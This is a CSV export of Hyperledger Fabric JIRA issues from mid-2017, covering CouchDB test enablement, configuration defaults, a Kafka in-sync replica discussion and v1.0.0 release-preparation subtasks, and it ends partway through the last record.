enable couchdb tests in byfn e2e script (fabric-samples),FAB-5056,18749,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,rameshthoomu,rameshthoomu,28/Jun/17 11:50 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,04/Jul/18 12:53 PM,v1.0.0,v1.0.0-rc1,,v1.0.0,,fabric-build,fabric-ci,,,,,0,build-system,,,,,,enable couchdb tests in byfn script (fabric-samples).,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy63b:",,,,,,,,,,,,,,,,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"04/Jul/18 12:53 PM;rameshthoomu;couchdb tests are integrated in byfn, eyfn scripts;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Need all the default values in one place (ex. core.yaml, orderer.yaml and configtx.yaml)",FAB-5059,18752,,Story,Closed,FAB,Fabric,software,denyeart,,,High,Won't Do,scottz,Ratnakar,Ratnakar,29/Jun/17 12:34 AM,09/Aug/19 10:58 PM,28/Oct/23 3:00 AM,09/Aug/19 10:58 PM,v1.0.0-rc1,,,,,fabric-docs,,,,,,0,,,,,,,"As an end user I should be able to see all the default configurations for the corresponding components in one place. And it should be easy for me to find those files, including from doc page and BYFN instructions. And the set of yaml files should contain ALL the default values, and be put in a directory location named ""config_defaults"" or something like that.

It is not clear if the fabric/sampleconfig /*.yaml files are the default values, and they do not set default values for all the possible configuration variables. Apparently, someone needs to refer the source code to gain a complete understanding of all the default settings.
 * *peer/gossip/ledger/endorser* etc., related configurations needs to be captured in _*core.yaml*_
 * *Orderer/Kafka* related default configurations in orderer.yaml (or what ever is the right file)
 * *configtx.yaml* _*-* channel config related configurations_

 ",,jarroyer,kchristidis,Ratnakar,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy63r:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,jarroyer,kchristidis,Ratnakar,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/Jul/17 6:02 AM;kchristidis;As best as I can tell, sampleconfig now carries `configtx.yaml`, `core.yaml`, and `orderer.yaml`?

Are we good? If yes, please mark as done.

If not, specify what's still left to do, e.g.
 * Do one
 * And two
 * And three;;;","13/Jul/17 12:56 AM;scottz;sampleconfig is one of many places where those 3 config files are stored in fabric and fabric-samples repositories. In any given instance where one of them (core.yaml, orderer.yaml, configtx.yaml) is mentioned, to which should the users refer?
 # Where do we define all the +default+ values for all the config parameters? Are the files in the fabric/sampleconfig/ directory the defaults? Or, are those the values to start with, which we recommend and support? All this should be stated somewhere in the docs where we instruct network administrators to get started (BYFN).
 # Rename sampleconfig as defaultconfig
 # Search the WYFA and BYFN instructions, and clarify the location of the config files used for those.
 # Search the rest of the documentation rst and readme.md files for references to the 3 config files and edit to specify the exact location in addition to the name of the referenced config files. For example, [http://hyperledger-fabric.readthedocs.io/en/latest/kafka.html] refers to orderer.yaml. Where do they find the file? Maybe we can consider revising this page, considering the audience to be a system administrator, rather than a developer. ;;;","13/Jul/17 11:52 AM;kchristidis;Let's start from point 2, which I actually disagree with.

I'll argue that ""sampleconfig"" _is_ the right name, specifically, because these are just that, _sample_ defaults. A proper config file should have inline comments or an associated doc (as is the case, for example, for Kafka) identifying incorrect values.

Moving on to point 4, there is no hard-coded exact location of config files. (This is, for instance, why I simply refer to ""orderer.yaml"" in the Kafka guide.) The location of the config files is governed by the following mechanism: if you have the FABRIC_CFG_PATH ENV var set, we (peer|orderer) will look for the config files there: [https://github.com/hyperledger/fabric/blob/master/core/config/config.go#L139] Otherwise, we will look for the files following this list: [https://github.com/hyperledger/fabric/blob/master/core/config/config.go#L147...L149]

What we may want to do is simply to create a doc that describes the config-location mechanism?

At any rate, there may still be valid points in this JIRA. (Or hey, every suggestion in your list may be right and I'm wrong.)

My suggestion for this kind of improvement requests that don't go too deep into touching code: submit a changeset that corresponds to your suggested TODO list here. Esp. for doc-related changes, only you know _exactly_ what you have in mind, and it's probably faster to push a changeset out there and give us something concrete to talk about.

As an example:

> Maybe we can consider revising this page, considering the audience to be a system administrator, rather than a developer. 

There is a good chance this is an excellent suggestion, but rather than me guessing (and missing) what would make for a good revision, we could use a changeset of yours as a starting basis.;;;","15/Jul/17 6:53 AM;scottz;WIP...  To do:

1. In fabric/orderer/README.md, change this sentence to instead refer to CONFIGTX_ORDERER_ORDERERTYPE:

```Specifically, the value corresponding to the `ConsensusType` key of the `Values` map of the `Orderer` config group on the system channel should be set to either `solo` or `kafka`.```

2. Maybe add a README.md in fabric/sampleconfig/. , or in docs/source/, which explains of FABRIC_CFG_PATH - how it (and its backup/defaults) is used for finding the configtx.yaml orderer.yaml core.yaml , as suggested by Kostas.

3. In BYFN, provide ptr link to fabric/sampleconfig/README

4. Combine these two sentences in [https://github.com/hyperledger/fabric/blob/release/docs/source/build_network.rst#manually-generate-the-artifacts] : 

```Next, we need to tell the configtxgen tool where to look for the configtx.yaml file that it needs to ingest. We will tell it look in our present working directory:

First, we need to set an environment variable to specify where configtxgen should look for the configtx.yaml configuration file```

 ;;;","15/Jul/17 6:56 AM;kchristidis;RE: Point 1 – Why is referring to an ENV var better than actually explaining what is being edited?;;;","17/Jul/17 10:33 PM;scottz;[~kchristidis] This being a readme.md inside the fabric folders, and intended for developers as well as users, I will add (so it is more useful to a user) instead of replace what is useful for a developer.;;;","07/Sep/17 10:49 AM;kchristidis;Just checking - is this on track for 1.1?;;;","29/Sep/17 12:41 AM;kchristidis;Last bump for updates. Are we doing this for 1.1?;;;","09/Aug/19 10:58 PM;scottz;This is outdated. These points are addressed in the fabric readthedocs.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Bring your first network (byfn): bootstrap peer setup in org2 is incorrect,FAB-5062,18765,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,AdnanChoudhury,AdnanChoudhury,AdnanChoudhury,29/Jun/17 5:01 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,30/Jun/17 1:50 AM,v1.0.0-rc1,,,v1.0.0,,fabric-samples,,,,,,0,quality,Quality,,,,,"1. in BYFN docker compose, the bootstrap peer for peer1Org2 is set to itself, which is not the intended way of usage of Bootstrap option. BYFN runs without any error as-is, but it inadvertently separates the peer1org2 from other peer of org2 and creates two leaders, instead of one, within the same org.

2. in the same file, the bootstrap to peer0Org2 is set to itself, which is not the intended behavior of bootstrap, and the line has no effect.",,AdnanChoudhury,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy647:",,,,,,,,,,,,,,,,,,,,,,,AdnanChoudhury,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Jun/17 5:15 AM;AdnanChoudhury;https://gerrit.hyperledger.org/r/#/c/11233/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
KAFKA_MIN_INSYNC_REPLICAS=2 setting is not honored after stop all KBs,FAB-5064,18770,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,bmos299,scottz,scottz,29/Jun/17 9:08 AM,21/Jul/18 3:55 AM,28/Oct/23 3:00 AM,10/Jul/17 5:54 AM,v1.0.0-rc1,,,WON'T FIX,,fabric-orderer,,,,,,0,quality,,,,,,"PROBLEM:  Kafka does not fully support the configured setting for KAFKA_MIN_INSYNC_REPLICAS. We found a scenario where the service is not provided when 2 of the 3 KBs in the RF set are active. Refer to the attached docker compose file that we used for the network; and in particular, note that we used these recommended network settings:
 * 4 kafka brokers
 * KAFKA_DEFAULT_REPLICATION_FACTOR=3
 * KAFKA_MIN_INSYNC_REPLICAS=2
 * orderer.yaml KAFKA_VERSION is unset; (file comment says default in fabric is 0.9.0.1; note latest kafka avail is 0.11.0)

SUMMARY:  We identified which 3 KBs were in the RF set. One at a time _(in the scenario below, we chose the newly elected leader every time, but that is not required because the last one always becomes the leader anyways when the 2nd last one is stopped)_, we docker stopped each of those. Then we restarted 2 of the 3. Note: we did NOT restart the last one stopped. Even after waiting 5 minutes, invoke transactions failed due to error SERVICE_UNAVAILABLE.

In this scenario _(see detailed steps below_), it appears Kafka fails to correctly manage its ISR set as nodes are stopped. For example, when 2 KBs are running and both are in the ISR set, stopping one causes it to be removed from the ISR set - leaving only the last node in the ISR set.

_This seems wrong, because that 2nd node does still contain the latest state of the partition - and that is important knowledge to have around in case the other/last node fails and cannot recover (which is exactly the scenario we are testing, and is exactly the reason for setting min_isr to 2 instead of 1). In fact, Kafka logic could leave it in the set, and also add a separate condition when processing transactions to confirm that at least min_isr KBs in the ISR set are also running/active (instead of just counting the number in the min_isr set)._

+We observed+ that after stopping the last KB and then restarting other KBs, they cannot elect a new partition leader and cannot resume functioning. That does not happen until THAT PARTICULAR LAST NODE is restarted - even if all the rest of the nodes are restarted.

+We expected+ that the network would resume functionality after recovery of KAFKA_MIN_INSYNC_REPLICAS=2 kafka brokers of the ISR set, but this did not happen (although it did work if the very last of the stopped KB was one of the restarted nodes).

Notes: We did not see any problems when we stopped all EXCEPT one KB and then restarted one or more additional nodes.

+Steps to Reproduce+:  (Please refer to attachment for the queries for data from the KBs)

Bring up a network, and query a KB on the channel to identify:
{noformat}
the KB nodes in RF set:  {3, 1, 2}
the KB nodes in the ISR set {3, 1, 2}
the partition leader = { 1 }{noformat}
 # stop 1.  Then observe: ISR set = \{2, 3} and leader = 3.
 # invoke - passed
 # stop 3.  Then observe: ISR set = \{2} and leader = 2.
 # invoke - failed as expected, since only 1 KB in RF set remains active
 # stop 2 , and wait a minute.
 # start 3.  Then observe: ISR set = \{2} and leader = -1. Active KBs = \{ 3 }
 # wait 2 minutes.
 # start 1.  Then observe: ISR set = \{2} and leader = -1. Active KBs = \{ 3,1 }
 # invoke - failed: SERVICE_UNAVAILABLE
 # wait 5 minutes, retry invoke - failed
 # start 2. Then observe: ISR set = \{2,3,1} and leader = 2. Active KBs = \{2,3,1}
 # invoke - passed

 

This related test scenario passed:  with all else being equal, in step 6, start kafka2 instead of kafka3. Then the invoke in step 10 passes.",,binhn,bmos299,jyellick,kchristidis,Nishi,Rajatsharma,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"29/Jun/17 9:07 AM;scottz;KafkaBrokerQueryResults .txt;https://jira.hyperledger.org/secure/attachment/11445/KafkaBrokerQueryResults+.txt",,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy64n:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,binhn,bmos299,jyellick,kchristidis,Nishi,Rajatsharma,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"29/Jun/17 10:22 PM;Clayton Sims;Scott are you saying this is a Kafka specific issue?;;;","29/Jun/17 11:17 PM;bmos299;[~Clayton Sims] yes this is specific to Kafka. ;;;","30/Jun/17 12:11 AM;jyellick;This is not a fabric bug.  I also do not believe this is a Kafka bug, it is Kafka working as designed.

Imagine KB2 receives a message while KB3 is going down.  KB2 might receive and acknowledge that message, then go down itself.  If KB3 comes back up with KB1 and turns the partition active, then this message acknowledged by KB2 could be lost, violating the guarantees of the Kafka system.

The last ISR must be a member of the new ISR set.

Closing as this is expected behavior.;;;","30/Jun/17 12:34 AM;jyellick;Note, from the compose file:

{noformat}
      #
      # unclean.leader.election.enable
      # Data consistency is key in a blockchain environment. We cannot have a
      # leader chosen outside of the in-sync replica set, or we run the risk of
      # overwriting the offsets that the previous leader produced, and --as a
      # result-- rewriting the blockchain that the orderers produce.
      - KAFKA_UNCLEAN_LEADER_ELECTION_ENABLE=false
{noformat}

This is exactly why you see the behavior observed.  Please see a more detailed discussion here:

http://kafka.apache.org/documentation/#design_ha

Also note that this is documented in the Fabric Kafka documentation in section 4.a https://github.com/hyperledger/fabric/blob/master/docs/source/kafka.rst;;;","30/Jun/17 2:29 AM;bmos299;[~scottz] let's change this to an improvement in document the symptom in stack overflow and have a pointer to the link provided above.  Also, [~mlishok] should be well aware of this one. ;;;","30/Jun/17 4:21 AM;scottz;Yes I have read those sections. Kafka talks about the difficulties, which is why it has several config variables to use. I disagree that there is no bug anywhere.

The section ""http://kafka.apache.org/documentation/#design_ha"" makes the following statements:
 * When writing to Kafka, producers can choose whether they wait for the message to be acknowledged by 0,1 or all (-1) replicas.
 * Specify a minimum ISR size - the partition will only accept writes if the size of the ISR is above a certain minimum, in order to prevent the loss of messages that were written to just a single replica, which subsequently becomes unavailable.
 * This [min ISR] setting only takes effect if the producer uses acks=all and guarantees that the message will be acknowledged by at least this many in-sync replicas.

We chose to set MIN_INSYNC_REPLICAS=2 and to set unclean.leader.election.enable=false. +*Can you confirm if the orderer does in fact use acks=all ?*+ *If not, then this could be a fabric bug.* According to those statements, fabric should do this for the MIN_INSYNC_REPLICAS setting to be effective. It is not discussed in [https://github.com/hyperledger/fabric/blob/master/docs/source/kafka.rst,] and I don't see anything in fabric/bddtests/*.yml or in fabric/sampletests/*yaml.

The problem is that the ISR set is reduced to one node, when MIN_INSYNC_REPLICAS is 2 (or more). Somehow, this does not cause problems until the scenario where only one node is running and one node is in the ISR set and then that node goes down too - at which point, kafka's promise (when using the suggested settings as directed) is broken.

This is serious for a practical installation. For data duplication and HA, Kafka says if we use suggested settings then we are assured that a blockchain would be able to resume if at least one in the ISR set is running - i.e. ANY one out of MIN_INSYNC_REPLICAS nodes. (The clear implication of setting MIN_INSYNC_REPLICAS=2 is that the ISR set should never drop below 2 nodes - but it does in this scenario, which shows that the blockchain can be permanently LOST if only ONE particular node is unrecoverable. What is the point of backing up data to multiple servers if that doesn't matter?;;;","30/Jun/17 5:28 AM;binhn;[~scottz]  This trade off makes sense to me as we wouldn't want the risks of inconsistency in data. Setting KAFKA_UNCLEAN_LEADER_ELECTION_ENABLE=false which means  {{if all replicas become unavailable, then the partition will remain unavailable until the most recent leader becomes available again.}}  And of course the ISR set helps with redundancy that if the leader failed, one of the replicas in the ISR would take over, so this rare case, total crash, would require careful restart.;;;","30/Jun/17 11:11 PM;scottz;In section [http://kafka.apache.org/documentation/#design_uncleanleader] (What if they all die?), it indicates 2 options. I agree we want option 1 ""Wait for a replica in the ISR to come back to life and choose this replica as the leader"". I agree we don't want a replica that is not in the ISR set, which does not have the latest data. The problem in this scenario is that there is only 1 node in the ISR set. My implications of using of min_isr=2 means that there should always be 2 in this ISR set. It IS a fact that at least 2 will have the latest view of the data. The only reason the 2nd-last KB is not in the ISR set is because it went down prior to the last one failing, and Kafka removed it from ISR set (because it is not currently AVAILABLE) although it still has the latest data. It seems Kafka could manage this better.

That said...

Assuming [~jyellick] answers my last question about the acks setting and confirms we are configured correctly, then there is nothing we can do; and unless Kafka fixed this hole in a more recent Kafka version, then... at least for now we need to accept that behavior and (as Barry suggested) to point it out to our blockchain network customers using Kafka for their ordering service. Hopefully they can design their network layout to reduce the chance that this unlikely scenario would happen.;;;","30/Jun/17 11:25 PM;jyellick;I had a conversation with [~kchristidis] about this to confirm that there is in fact, no bug here.

I would point out first, that the crash fault tolerance has been exceeded in this test.  With a RF=3 and MIN_ISR=2, all three nodes have crashed.  There is no guarantee for data integrity.

----

Here is an explanation of this behavior in more detail:

Kafka producers may select one of three behaviors for how messages are acknowledged.  To quote from the link above:

> When writing to Kafka, producers can choose whether they wait for the message to be acknowledged by 0,1 or all (-1) replicas.

The fabric Kafka producer is appropriately setting itself to 'all' for this behavior.

However, this is a client setting, and not a cluster setting.  There is no way for the cluster to enforce client behavior.  So, when KB1/KB2 have failed, there is no way to guarantee that a Kafka producer does not connect with an acknowledgement setting of 1, and successfully send messages to KB3.

For this reason, after KB3 goes down, KB2 has no idea if another producer connected and sent messages with the ack behavior of 1 (or 0), so it appropriately does not included itself in the ISR set, because without communicating with KB3, there is no way to know.

----

So, in summary.  This behavior is expected and this behavior is not a bug because the CFT parameters of Kafka have been violated by this test. ;;;","30/Jun/17 11:39 PM;jyellick;Just to call it out a little more explicitly, [~scottz]

> Assuming Jason Yellick answers my last question about the acks setting and confirms we are configured correctly, then there is nothing we can do;

Yes, the fabric kafka producer sets the acks setting to all.

-----

And just a little further information courtesy of [~kchristidis]

> A replica needs to have an active session with ZK for it to eligible for inclusion in the ISR set.
> It also needs to do a ""fetch"" to the leader for latest messages in the last 10 seconds.

So, in the test described in the issue, KB2 has been out of contact with ZK, and not talked with the leader in the last 10 seconds, so it necessarily cannot be part of the ISR set.

Whether Kafka could handle this better (which I am certain, is much easier said than done) or not, as you point out, there is nothing we can do to change this behavior.;;;","01/Jul/17 5:16 AM;scottz;Thanks!;;;","10/Jul/17 5:54 AM;kchristidis;Don't see any reason for this to still be open, closing.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,
Cut v1.0.0 release,FAB-5065,18773,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,ChristopherFerris,ChristopherFerris,29/Jun/17 7:57 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,20/Jul/17 12:06 AM,v1.0.0-rc1,,,v1.0.0,,fabric-release,,,,,,1,release,,,,,,"Maintainers take into consideration the number of defects reported, minus the ones fixed,  against rc1 along with the *severity* of anything that's pending in order to make a call on whether our upcoming and scheduled cut (due for July 7) should be tagged as  -rc2 or final release. ",,ChristopherFerris,JonathanLevi,mastersingh24,peoplehlj,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61260,61260,,Not a security issue,FAB-4539,FABC-422,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy653:",,,,,,,,,,,2.0,,,,,,,,,,,,ChristopherFerris,JonathanLevi,mastersingh24,peoplehlj,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"29/Jun/17 8:56 PM;ChristopherFerris;Note, I created a query to review all defects opened during the rc1 period (I prepended a couple of extra days)

[https://jira.hyperledger.org/issues/?filter=10706]

This should be reviewed by maintainers to ensure that the severity is correctly reflected and that none would impede the release.;;;","30/Jun/17 10:15 PM;mastersingh24;I assume that if we go with v1.0.0 (and not an rc2) that we should *finally* update the *latest* tag for the images to point to the v1.0.0 images rather than the v0.6 images?;;;","01/Jul/17 12:41 AM;ChristopherFerris;[~mastersingh24] good point... I suspect we could/should.;;;","01/Jul/17 1:04 AM;JonathanLevi;I agree. That should be the LATEST.;;;","20/Jul/17 12:19 AM;JonathanLevi;What's the status of:

prepare fabric-sdk-java for release

and,

Update balance-transfer sample to v1.0.0 ?;;;","20/Jul/17 12:27 AM;ChristopherFerris;Java done and AFAICT the other is in review and will land in 1.0.1 - hence irrelevant to 1.0.0;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Prepare the fabric branch for release, by setting the Makefile flags",FAB-5066,18774,18773,Sub-task,Closed,FAB,Fabric,software,denyeart,,,High,Done,mastersingh24,ChristopherFerris,ChristopherFerris,29/Jun/17 7:57 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,11/Jul/17 11:55 PM,v1.0.0-rc1,,,v1.0.0,,fabric-release,,,,,,0,release,,,,,,"*MUST BE REBASED JUST BEFORE MERGING*

Check for clean CI passes

Update Makefile

{{BASE_VERSION = 1.0.0}}
 {{PREV_VERSION = 1.0.0-rc1}}
 {{IS_RELEASE = true}}

{{release_notes/v1.0.0.txt should be updated}}

{{docs/source/releases.rst should be updated with prose and link to GH release page}}

{{change log should be generated just *after* *rebasing* to pick up the last minute merged CRs and linked from docs/source/releases.rst}}",,ChristopherFerris,JonathanLevi,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,7200,7200,,0%,7200,7200,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy65b:",,,,,,,,,,,1.0,,,,,,,,,,,,ChristopherFerris,JonathanLevi,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"11/Jul/17 9:04 PM;JonathanLevi;[~rameshthoomu], let's prioritize this please.;;;","11/Jul/17 11:18 PM;mastersingh24;https://gerrit.hyperledger.org/r/#/c/11523/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
prepare fabric-ca for release,FAB-5067,18775,18773,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,ChristopherFerris,ChristopherFerris,29/Jun/17 7:57 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,12/Jul/17 1:36 AM,v1.0.0-rc1,,,v1.0.0,,fabric-release,,,,,,0,release,,,,,,"*MUST BE REBASED JUST BEFORE MERGING*

Check for clean CI

Update Makefile

{{BASE_VERSION = 1.0.0}}
 {{PREV_VERSION = 1.0.0-rc1}}
 {{IS_RELEASE = true}}

change log should be generated just *after* *rebasing* to pick up the last minute merged CRs 

 update release_notes/v1.0.0.txt",,ChristopherFerris,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,7200,7200,,0%,7200,7200,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy65j:",,,,,,,,,,,1.0,,,,,,,,,,,,ChristopherFerris,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,main,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"11/Jul/17 11:45 PM;mastersingh24;https://gerrit.hyperledger.org/r/11533;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
prepare fabric-sdk-node for release,FAB-5068,18776,18773,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jimthematrix,ChristopherFerris,ChristopherFerris,29/Jun/17 7:57 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,12/Jul/17 2:19 AM,v1.0.0-rc1,,,v1.0.0,,fabric-release,,,,,,0,release,,,,,,"*MUST BE REBASED JUST PRIOR TO MERGING*

generate CHANGELOG.md just *after rebasing* to pick up last minute merged CRs

update release_notes/v1.0.0.txt

update package.json files with the release identifier

  examples/balance-transfer/package.json

  fabric-client/package.json

  fabric-ca-client/package.json",,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,7200,7200,,0%,7200,7200,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy65r:",,,,,,,,,,,1.0,,,,,,,,,,,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dev,main,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
prepare fabric-sdk-java for release,FAB-5069,18777,18773,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,ChristopherFerris,ChristopherFerris,29/Jun/17 7:57 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,20/Jul/17 12:27 AM,v1.0.0-rc1,,,v1.0.0,,fabric-release,,,,,,0,release,,,,,,"*MUST BE REBASED JUST PRIOR TO MERGING*

generate CHANGELOG.md just *after rebasing* to pick up last minute merged CRs

update release_notes/v1.0.0.txt

update pom.xml with correct version

update src/test/fixture/sdkintegration/.env

update README.md",,ChristopherFerris,satoshi.oshima,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy65z:",,,,,,,,,,,1.0,,,,,,,,,,,,ChristopherFerris,satoshi.oshima,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
prepare fabric for next release,FAB-5070,18778,18773,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,ChristopherFerris,ChristopherFerris,29/Jun/17 7:57 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,11/Jul/17 11:42 PM,v1.0.0,,,v1.0.1,,fabric-release,,,,,,0,release,,,,,,"Update Makefile

{{BASE_VERSION = 1.0.1}}
 {{PREV_VERSION = 1.0.0}}
 {{IS_RELEASE = false}}",,ChristopherFerris,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,3600,3600,,0%,3600,3600,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy667:",,,,,,,,,,,1.0,,,,,,,,,,,,ChristopherFerris,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"11/Jul/17 11:26 PM;mastersingh24;https://gerrit.hyperledger.org/r/#/c/11529/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
prepare fabric-ca for next release,FAB-5071,18779,18773,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,ChristopherFerris,ChristopherFerris,29/Jun/17 7:57 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,14/Jul/17 10:46 PM,v1.0.0,,,v1.0.1,,fabric-release,,,,,,0,release,,,,,,"Update Makefile

{{BASE_VERSION = 1.0.1}}
 {{PREV_VERSION = 1.0.0}}
 {{IS_RELEASE = false}}",,ChristopherFerris,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,3600,3600,,0%,3600,3600,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy66f:",,,,,,,,,,,1.0,,,,,,,,,,,,ChristopherFerris,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,main,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"11/Jul/17 11:47 PM;mastersingh24;https://gerrit.hyperledger.org/r/11535;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
prepare fabric-sdk-node for next release,FAB-5072,18780,18773,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jimthematrix,ChristopherFerris,ChristopherFerris,29/Jun/17 7:57 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,14/Jul/17 6:33 PM,v1.0.0,,,v1.0.1,,fabric-release,,,,,,0,release,,,,,,"update package.json files with the SNAPSHOT release identifier

  examples/balance-transfer/package.json

  fabric-client/package.json

